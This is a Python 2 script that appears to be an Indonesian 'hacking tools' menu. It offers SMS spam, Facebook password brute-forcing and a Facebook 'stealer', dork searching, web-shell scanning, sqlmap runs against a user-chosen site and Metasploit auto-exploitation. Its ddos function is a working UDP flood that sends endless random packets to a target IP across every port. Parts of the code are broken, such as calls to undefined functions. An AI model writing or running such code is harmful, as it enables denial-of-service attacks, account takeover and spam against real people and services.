import os
import sys
import random
import time
import json
import urllib
import urllib2
import socket
import requests
import threading

R = "\033[1;31m";
G = "\033[5;32m";
B = "\033[1;34m";
Y = "\033[1;33m";
P = "\033[1;35m";
C = "\033[1;36m";
W = "\033[1;37m";
import platform,os,sys
def cetak(x,e=0):
	w = 'mhkbpcP'
	for i in w:
		j = w.index(i)
		x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
	x += '\033[0m'
	x = x.replace('!0','\033[0m')
	if e != 0:
		sys.stdout.write(x)
	else:
		sys.stdout.write(x+'\n')

#oi jangan di recode yak
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)

on = raw_input("\033[1;31mYakin mau pakai tools ini? \033[1;34m[Y/t] \033[5;32m kalau sudah tekan" "\033[1;36m [m/enter] :")
if on == "t":
    on("Exit...")
    os.system("exit")
if on == "y":
    os.system("apt update && upgrade")
    os.system("apt install net-tools")
    os.system("pkg install net-tools")
    os.system("apt install python2")
    os.system("apt install php5")
    os.system("apt install php")
    os.system("apt install git")
    os.system("apt install mechanize")
    os.system("clear")
if on == "m":
    os.system("clear")
if on == "": 
    ('!mmasukan opsinya:')


__banner__=("""
 \033[1;34m     Creator\033[0m \033[1;33m:\033[0m \033[1;36m<<Mr_MSDV>>\033[0m 
 \033[1;31m        Team \033[1;33m:\033[1;32m BR1GADE_BR0TH3R
 \033[0m        Code \033[1;33m: \033[1;32mPython2.7\033[0m
 \033[1;36mTime Created : \033[1;31mSat 8.22 May 2018\033[0m
 \033[1;34m          Fb \033[1;33m: \033[1;32mMARTIN SUDEVI\033[0m
 \033[1;32m      Github \033[1;33m: \033[1;32mhttps://github.com/mrmsdv\033[0m
 \033[1;31m        Note \033[1;33m: \033[5;35mDon't Recode ^_^ \033[1;31m<3
\033[0m
""").center(40)
print("\033[1;33mFirst Read a Notification For Use this tool")
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
		except:
			cetak('\n!m[!] Batal')
			keluar()
		if v:
			if a.upper() in v:
				break
			else:
				cetak('!m[!] Masukan Opsinya Bro...')
				continue
		else:
			if len(a) == 0:
				cetak('!m[!] Masukan dengan benar')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			cetak('!m[!] Pilihan tidak ada')
			continue
		if i in d:
			break
		else:
			cetak('!m[!] Pilihan tidak ada')
	return i
def about():
   mengetik + cetak("""
    BR1G4D3R_TOOLS adalah Tool Gabungan yang siap di pakai 
    bukan tool auto installer.!!!
    Special Thanks to :
    All Member BR1G4D3_BR0TH3R""")
    
def main():
	cetak('''!k


                               /T /I
                              / |/ | .-~/
                          T\ Y  I  |/  /  _
         /T               | \I  |  I  Y.-~/
        I l   /I       T\ |  |  l  |  T  /
 __  | \l   \l  \I l __l  l   \   `  _. |
 \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |
  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
 >--.  ~-.   ._  ~>-"    "\\   7   7   ]
^.___~"--._    ~-{  .-~ .  `\ Y . /    |
 <__ ~"-.  ~       /_/   \   \I  Y   : |
   ^-.__           ~(_/   \   >._:   | l______
       ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
              (_/ .  ~(   /'     "~"--,Y !m  -=b-.!k_)
               (_/ .  \  :           / l      c"~o \ 
                \ /    `.    .     .^   \_.-~"~--.  )
                 (_/ .   `  /     /       !       )/
                  / / _.   '.   .':      /        '
                  ~(_/ .   /    _  `  .-<_
                    /_/ . ' .-~" `.  / \  \          ,z=.
                    ~( /   '  :   | K   "-.~-.______//
                      "-,.    l   I/ \_    __{--->._(==.
                       //(     \  <    ~"~"     //
                      /' /\     \  \     ,v=.  ((
                    .^. / /\     "  }__ //===-  `
                   / / ' '  "-.,__ {---(==-
                 .^ '       :  T  ~"   ll       -Row
                / .  .  . : | :!        \\
               (_/  /   | | j-"          ~^	

''')
def ipme():
    os.system("ifconfig")
    help()
def spam():
    os.system("php bin/jdid.php")
    main()
def shell_scan():
    os.system("python2 bin/VS.py")
    main()
def ko_dork():
    os.system("python2 bin/dork.py")
    main()
def osif():
    os.system("python2 bin/osif.py")
    main()
def iploc():
    os.system("python2 bin/iploc.py")
    main()
def fbb():
    os.system("python2 bin/fb.py")
def mcf():
    os.system("python2 bin/MCF.py")
    main()
def sql():
    web =inputD('[?]web target:') 
    mtd =inputD('[?]option: (--dbs,-D,dll)')
    os.system("python2 sqlmap/sqlmap.py -u %s %s"%(web,mtd))
def ddos():
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1490)
	print __banner__
	ip = raw_input("\033[1;36mBR1G4D3_BR0TH3R \033[1;32m>>\033[0m \033[1;36mtarget IP : \033[0m")
	print "\033[1;34mTarget \033[5;32m%s \033[1;31m[\033[1;32mLocked\033[1;31m]\033[0m"%(ip)
	port = input("BR1G4D3_BR0TH3R  \033[1;32m>>\033[0m port : ")
	print "\n\033[1;31m[\033[1;32m~\033[1;31m]\033[0m Start to Attacking...\n"
	time.sleep(2.5)
	sent = 0
	while True:
		sock.sendto(bytes, (ip,port))
		sent = sent + 1
		port = port + 1
		print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
		if port == 65534:
			port = 1    
  
	    
def auto():
    os.system("bash bin/install.sh")
    main()
def nano():
	f = inputD('!m[?]masukin nama wordlistnya:')
        os.system("nano %s"%(f))
def help():
    cetak('''
!P[+]!m=================================================!P[+]
!c||    !hCommand                Description          !c   ||
|| ----------------       ---------------------   !c   ||
||    ipme               Check My Ip Address      !b   ||
||    spam               Spam Sms jdid 		  !h   ||
||    shell scan         Scan website		  !m   ||
||    ko-dork            search dork		  !k   ||
||    osif               Osif		          !p   ||
||    fb                 bruteforce password fb   !P   ||
||    nano		 untuk Edit wordlist	  !c   ||
||    sql		 sqlmap      		  !m   ||
||    mcf		 Mesincuri Fb 		  !b   ||
||    tracker            Track Ip                 !h   ||
||    auto sploit        Auto Exploit with msf    !k   ||
||    ddos               ddos attack		  !c   ||
||    help               Show help		  !p   ||
||    about              Info This Tool		  !P   ||
||    !mexit               exit the program         !k   ||
!P[+]!c=================================================!P[+]
      
      * tools dalam tahap pengembangan
      * (Mohon saran dan kritiknya)
     \033[0m
     ''')
     
    
print __banner__
while True:
    cmd = raw_input("[*]BR1G4D3\033[1;31m_\033[0mBR0TH3R=> ").lower()
    
    if cmd == "h":
        help()
        
    elif cmd == "ipme":
          ipme()

    elif cmd == "nano":
	  nano()

    elif cmd == "spam":
          spam()
          
    elif cmd == "osif":
          osif()
                
    elif cmd == "exit":
          os.system("exit")
           
    elif cmd == "about":
          about()
          
    elif cmd == "ko-dork":
          ko_dork()
          
    elif cmd == "shell scan":
          shell_scan()
          
    elif cmd == "tracker":
          iploc()

    elif cmd == "mcf":
          mcf()

    elif cmd == "fb":
          fbb()

    elif cmd == "sql":
          sql()
          
    elif cmd == "ddos":
          ddos()
           
    elif cmd == "ghack":
          fbghack()
          
    elif cmd == "auto sploit":
          auto()
